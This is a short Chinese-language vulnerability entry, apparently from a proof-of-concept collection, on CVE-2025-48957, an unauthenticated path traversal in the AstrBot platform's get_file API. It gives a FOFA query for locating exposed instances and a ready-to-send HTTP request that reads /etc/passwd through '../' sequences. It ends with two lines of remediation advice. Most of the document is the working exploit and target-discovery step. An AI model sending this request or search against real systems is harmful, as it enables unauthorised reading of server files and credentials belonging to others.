## AstrBot get_file 任意文件读取漏洞（CVE-2025-48957）

## 漏洞描述
AstrBot AI 助手平台的 `get_file` API 未过滤 `filename` 参数，可任意拼接路径访问服务器文件，远程未认证攻击者可读取敏感配置与系统凭据。

## 网络空间测绘
```
fofa: title="AstrBot"
```

## POC
```
GET /api/chat/get_file?filename=../../../../../../etc/passwd HTTP/1.1
Host: <target domain>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
```
若返回包含 `/etc/passwd` 内容，即可确认漏洞存在。

## 修复建议
- 对 `filename` 做路径白名单，禁止 `../`
- 将文件下载服务下沉到对象存储，并通过 Token 校验

## 参考
- 社区披露（CVE-2025-48957）

